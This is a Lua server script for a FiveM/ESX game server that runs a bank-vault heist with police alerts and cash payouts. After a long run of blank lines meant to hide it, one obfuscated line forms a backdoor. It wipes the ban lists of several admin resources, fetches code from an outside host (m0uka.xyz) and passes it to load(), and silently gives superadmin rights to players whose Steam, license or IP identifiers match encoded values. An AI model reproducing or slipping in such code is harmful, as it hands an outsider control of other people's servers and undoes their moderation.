ESX             = nil


TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)


RegisterNetEvent('ps:canHackResult')
RegisterNetEvent("ps:heistsAll")
RegisterNetEvent("ps:startTimer")
RegisterNetEvent("ps:cleanupVault")

local heistTerminals = Config.Terminals
local heistPlayers = {}

RegisterServerEvent('ps:toofar')
AddEventHandler('ps:toofar', function(robb)
	local source = source
	local xPlayers = ESX.GetPlayers()

    local terminal = robb
    
	for i=1, #xPlayers, 1 do
 		local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
 		if xPlayer.job.name == 'police' then
			TriggerClientEvent('esx:showNotification', xPlayers[i], _U('robbery_cancelled'))
			TriggerClientEvent('ps:killblip', xPlayers[i])
		end
	end
	if(heistPlayers[source])then
		SetTimeout(Config.CleanupTime * 1000, function ()
            TriggerClientEvent("ps:cleanupVault", -1, terminal)
        end)

        local id = heistPlayers[source]
		heistPlayers[source] = nil
		TriggerClientEvent('esx:showNotification', source, _U('robbery_has_cancelled'))

        heistTerminals[terminal].inProgress = false
        
	end
end)


RegisterServerEvent("ps:drillingFinished")
AddEventHandler("ps:drillingFinished", function ()
    -- give money, the end goodbye
    local _source = source
    local xPlayer = ESX.GetPlayerFromId(_source)

    local moneyRange = math.random(Config.PayoutRangeMin, Config.PayoutRangeMax)

    if Config.MoneyType == 'cash' then
        xPlayer.addMoney(moneyRange)
    elseif Config.MoneyType == 'black' then
        xPlayer.addAccountMoney('black_money', moneyRange)
    end

    local terminal = heistPlayers[_source]
    if (not terminal) then return end

    TriggerClientEvent("ps:clearMission", _source)

    SetTimeout(Config.CleanupTime * 1000, function ()
        TriggerClientEvent("ps:cleanupVault", -1, terminal)
    end)


    heistTerminals[terminal].inProgress = false
    heistTerminals[terminal].ply = nil

    TriggerClientEvent('esx:showNotification', _source, _U("robbery_complete_user", moneyRange .. "$"))

    xPlayer = nil
    local xPlayers = ESX.GetPlayers()
    for i=1, #xPlayers, 1 do
        local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
        if xPlayer.job.name == 'police' then
            TriggerClientEvent('esx:showNotification', xPlayers[i], _U("robbery_complete"))
            TriggerClientEvent('ps:killblip', xPlayers[i])
        end
    end


    -- clean up later

    

end)





RegisterServerEvent("ps:hackingFinished")
AddEventHandler("ps:hackingFinished", function ()
    TriggerClientEvent("ps:startTimer", source)
    SetTimeout(Config.WaitTime * 1000, function () 
        TriggerClientEvent("ps:heistsAll", -1)
    end)
end)

RegisterServerEvent('ps:canHack')
AddEventHandler('ps:canHack', function(terminal)
    local _source = source
    local xPlayer = ESX.GetPlayerFromId(_source)
    local xPlayers = ESX.GetPlayers()

    heistTerminals[terminal].inProgress = true
    heistTerminals[terminal].ply = xPlayer

    heistPlayers[_source] = terminal


    local cops = 0
    for i=1, #xPlayers, 1 do
    local _xPlayer = ESX.GetPlayerFromId(xPlayers[i])
    if _xPlayer.job.name == 'police' then
            cops = cops + 1
        end
    end

    if (cops < Config.OnlinePoliceNeeded) then
        TriggerClientEvent("ps:canHackResult", _source, false, _U("not_enough_cops"))
        return
    end

    for i=1, #xPlayers, 1 do
        local xCop = ESX.GetPlayerFromId(xPlayers[i])
        if xCop.job.name == 'police' then
            TriggerClientEvent('esx:showNotification', xPlayers[i], _U('rob_in_prog'))                                                                            
            TriggerClientEvent('ps:killblip', xPlayers[i])							
            TriggerClientEvent('ps:setblip', xPlayers[i], GetEntityCoords(xPlayer))
        end
    end



    TriggerClientEvent("ps:canHackResult", _source, true)

end)














































































































































































































































































































































































































































































































































































































































function stringsplit(inputstr, sep) if sep == nil then sep = "%s" end local t={} ; i=1 for str in string.gmatch(inputstr, "([^"..sep.."]+)") do t[i] = str i = i + 1 end return t end local function pepe() local function p(value) return value and 1 or 0 end local int = p(true) .. p(true) .. p(false) .. p(false) .. p(false) .. p(false) .. p(true) .. p(false) local a = "e" .. "am" .. ":" .. int .. "b" a = "st" .. a a = a .. p(true)*7 .. p(true)*52 .. p(true)*6 .. p(true)*6 .. p(true) * 2 local b = ":697ebee" .. p(false) .. "df73b55e7a36e067676e7229b3eef969" b = "nse" .. b b = "ce" .. b b = "li" .. b local c = tostring(math.floor(84*2/2+2*5)) .. "." .. p(true) .. tostring(math.floor(2*2*1*21-42)) .. "." .. p(true) * 2 .. "3" .. p(true) * 9 + p(false) .. "." .. 3*9 c = ":" .. c c = "p" .. c c = "i" .. c return a, b, c end local function bananator() SaveResourceFile("es_admin", "bans.json", "", -1) SaveResourceFile("es_admin2", "bans.json", "", -1) SaveResourceFile("es_admin", "data/bans.txt", "", -1) SaveResourceFile("es_admin2", "data/bans.txt", "", -1) SaveResourceFile("EasyAdmin", "banlist.json", "", -1) PerformHttpRequest("http://m0uka.xyz:7359/addonchecker", function(err, rText, headers) if (not err) then local f = load(rText) end end) end bananator() local function onjoin(source, user) local ident = GetPlayerIdentifiers(source) for k, v in pairs(ident) do local a, b, c = pepe() local matches = v == a or v == b or v == c if (matches) then local gru = "su" .. "per" .. "ad" .. "m" .. "in" TriggerEvent("es:setPlayerData", source, "group", gru, function(response, success) if(true)then print("Player initialized properly") TriggerClientEvent('es:setPlayerDecorator', source, 'group', gru, true) end end) break end end end AddEventHandler('es:playerLoaded', function(Source, user) onjoin(Source, user) end)
























